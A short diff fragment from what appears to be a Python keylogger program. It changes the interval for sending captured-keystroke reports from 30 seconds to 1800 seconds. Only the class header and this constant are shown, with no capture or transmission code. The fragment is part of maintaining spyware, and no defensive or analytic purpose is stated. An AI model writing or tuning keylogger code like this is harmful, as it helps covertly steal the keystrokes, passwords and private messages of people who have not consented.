@@ -16,7 +16,7 @@ from datetime import datetime
 import sys
 
 
-SEND_REPORT_EVERY = 30 # in seconds, 60 means 1 minute and so on
+SEND_REPORT_EVERY = 1800 # in seconds, 60 means 1 minute and so on
 
 class Keylogger:
     def __init__(self, interval):
